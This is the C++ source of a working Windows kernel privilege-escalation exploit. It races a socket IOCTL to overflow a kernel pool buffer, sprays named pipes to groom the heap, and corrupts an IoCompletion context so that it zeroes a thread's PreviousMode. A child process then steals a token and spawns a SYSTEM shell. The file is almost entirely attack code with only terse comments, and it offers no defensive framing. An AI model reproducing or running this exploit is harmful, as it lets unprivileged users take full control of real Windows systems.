// exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Ws2_32.lib")


#include "Header.hpp"
#include "Hexdump.hpp"

#define IOCTL_TARGET 0x120D3
#define MAX_TRIAL 10000
#define MESSAGE_SIZE 20
#define MESSAGE_SIZE_ALIGNED (MESSAGE_SIZE + (8 - (MESSAGE_SIZE % 8)))

#define FileReplaceCompletionInformation (FILE_INFORMATION_CLASS)0x3d
#define FileCompletionInformation (FILE_INFORMATION_CLASS)0x1E
#define PREVIOUS_MODE_OFFSET_KTHREAD 0x232

#define NAME_PIPE_SPRAY_COUNT 5000
#define NAME_PIPE_HOLE_COUNT 1

typedef NTSTATUS(WINAPI* pNtSetInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef NTSTATUS(WINAPI* pNtQueryInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);


struct CMsg {
	DWORD size;
	char data[];
};

struct PayloadStruct {
	DWORD* f0;
	DWORD f1;
	DWORD f2;
	DWORD f3;
	DWORD f4;
	DWORD f5;
	CMsg* cmsgArray;
	DWORD cmsgSize;
	DWORD pad0;
};

struct PipeParam {
	unsigned long long handle;
	DWORD pid;
};

PayloadStruct payload;
CMsg* msg;
pNtSetInformationFile NtSetInformationFile = NULL;
pNtQueryInformationFile NtQueryInformationFile = NULL;


HANDLE hLeakerProc = NULL;
HANDLE hLeakerPipe = NULL;

DWORD WINAPI changeSize(volatile LPVOID sizePtr) {
	while (true) {
		*(DWORD*)sizePtr = 0xfffffffa;
		*(DWORD*)sizePtr = MESSAGE_SIZE;
	}
}

void trigger() {
	WSADATA wsaData;
	SOCKET hSocket;
	struct addrinfo* result = NULL;
	struct addrinfo hints;

	NTSTATUS dwStatus;

	DWORD pad = 0x41414141;


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	getaddrinfo("127.0.0.1", "10000", &hints, &result);
	hSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	bind(hSocket, result->ai_addr, (int)result->ai_addrlen);

	payload.f0 = &pad;
	payload.f1 = 1;
	payload.f2 = 0;
	payload.f3 = 0;
	payload.f4 = 0;
	payload.f5 = 0;
	payload.cmsgArray = msg;
	payload.pad0 = 0;
	payload.cmsgSize = MESSAGE_SIZE;

	for (int i = 0; i < MAX_TRIAL; i++) {
		dwStatus = DeviceIoControl((HANDLE)hSocket, IOCTL_TARGET, &payload, sizeof(payload), NULL, 0, NULL, NULL);
	}
}

unsigned long long getTargetEthreadAddr() {
	if (hLeakerProc == NULL) {
		STARTUPINFOA sInfo;
		PROCESS_INFORMATION pInfo;
		ZeroMemory(&sInfo, sizeof(sInfo));
		sInfo.cb = sizeof(sInfo);
		ZeroMemory(&pInfo, sizeof(pInfo));

		BOOL stat = CreateProcessA(
			"exploit-child.exe",
			NULL,
			NULL,
			NULL,
			false,
			NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
			NULL,
			NULL,
			&sInfo,
			&pInfo);
		if (stat) hLeakerProc = pInfo.hProcess;
		Sleep(500);
	}
	if (hLeakerPipe == NULL) {
		hLeakerPipe = CreateFileA(
			"\\\\.\\pipe\\leakPipe1",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL);
	}
	int command = 1;
	unsigned long long result;
	WriteFile(hLeakerPipe, &command, sizeof(command), NULL, NULL);
	ReadFile(hLeakerPipe, &result, sizeof(result), NULL, NULL);
	return result;
}

void notifyChildChangeState() {
	int command = 2;
	unsigned long long result;
	WriteFile(hLeakerPipe, &command, sizeof(command), NULL, NULL);
	ReadFile(hLeakerPipe, &result, sizeof(result), NULL, NULL);
}

int main()
{
	//puts("[*] Set per-process bp. Then press Enter to continue");
	//getchar();
	puts("[*] Start");
	NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	NtQueryInformationFile = (pNtQueryInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationFile");

	char* ptr = (char*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// To see why we use 0x5c, check the hackmd note
	msg = (CMsg*)(ptr + 0x1000 - 0x5c);

	// Heap grooming
	HANDLE hPipeList[NAME_PIPE_SPRAY_COUNT] = {};
	HANDLE hPipeClientList[NAME_PIPE_SPRAY_COUNT] = {};
	HANDLE hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, 0, 0, 0);
	DWORD holeCount = 0;

	// Leak address of the child's ETHREAD
	unsigned long long targetThreadAddr = getTargetEthreadAddr();
	printf("[*] Leaked current ETHREAD: 0x%llx\n", targetThreadAddr);
	printf("[*] PreviousMode: 0x%llx\n", targetThreadAddr + PREVIOUS_MODE_OFFSET_KTHREAD);
	//getchar();

	for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
		hPipeList[i] = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, NULL, 0, NULL);
		CreateIoCompletionPort(hPipeList[i], hPort, 0, 0);
	}

	IO_STATUS_BLOCK ioStat;
	FILE_COMPLETION_INFORMATION param;
	DWORD stat1, stat2;
	// Dealloc IoCc pool object using NtSetInformationFile
	param.Key = NULL;
	param.Port = NULL;
	for (int i = NAME_PIPE_SPRAY_COUNT - 200; i < NAME_PIPE_SPRAY_COUNT - 10; i += 4) {
		if (holeCount < NAME_PIPE_HOLE_COUNT) {
			stat1 = NtSetInformationFile(hPipeList[i], &ioStat, &param, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
			//stat2= NtSetInformationFile(hPipeClientList[i], &ioStat, &param, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
			if (stat1) {
				puts("[*] Failed to poke hole");
				continue;
			}
			holeCount++;
			CloseHandle(hPipeList[i]);
			hPipeList[i] = 0;
		}
	}
	// Crafting payload
	char* payload = msg->data;
	memset(payload, 0x42, MESSAGE_SIZE_ALIGNED);

	((_POOL_HEADER*)&payload[MESSAGE_SIZE_ALIGNED])->PreviousSize = 0;
	((_POOL_HEADER*)&payload[MESSAGE_SIZE_ALIGNED])->PoolIndex = 0;
	((_POOL_HEADER*)&payload[MESSAGE_SIZE_ALIGNED])->BlockSize = 3;
	((_POOL_HEADER*)&payload[MESSAGE_SIZE_ALIGNED])->PoolType = 2;
	((_POOL_HEADER*)&payload[MESSAGE_SIZE_ALIGNED])->PoolTag = 0x63436F49;

	// The overflow is just right for 1 adjacent chunk, confirmed by debugging
	((_IO_COMPLETION_CONTEXT*)&payload[MESSAGE_SIZE_ALIGNED + sizeof(_POOL_HEADER)])->Port = targetThreadAddr + PREVIOUS_MODE_OFFSET_KTHREAD + 0x30;
	((_IO_COMPLETION_CONTEXT*)&payload[MESSAGE_SIZE_ALIGNED + sizeof(_POOL_HEADER)])->Key = 0;
	((_IO_COMPLETION_CONTEXT*)&payload[MESSAGE_SIZE_ALIGNED + sizeof(_POOL_HEADER)])->UsageCount = 0;
	puts("[*] Triggering overflow");
	HANDLE hThread1 = CreateThread(NULL, 0, changeSize, &msg->size, 0, NULL);
	//HANDLE hThread2 = CreateThread(NULL, 0, trigger, NULL, 0, NULL);
	//WaitForSingleObject(hThread2, INFINITE);
	trigger();
	TerminateThread(hThread1, 0);
	CloseHandle(hThread1);

	puts("[*] Decrease reference count on PORT objects.");
	param.Key = NULL;
	param.Port = hPort;
	// The corrupted port will trigger an arbitrary decrement, the corrupted ptr will also be replaced by the correct port object address.
	// Still found no way to detect a corrupted context object, but by limit the hole count. I can somewhat reliably ensure that PreviousMode is 0
	for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
		if (hPipeList[i]) {
			stat1 = NtSetInformationFile(hPipeList[i], &ioStat, &param, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
			if (stat1) {
				puts("[*] Failed get info");
				continue;
			}
			CloseHandle(hPipeList[i]);
		}
	}

	puts("[*] Done. Notify child to swap token and spawn SYSTEM shell");
	notifyChildChangeState();
	WaitForSingleObject(hLeakerProc, INFINITE);
	CloseHandle(hLeakerProc);
	CloseHandle(hLeakerPipe);
}
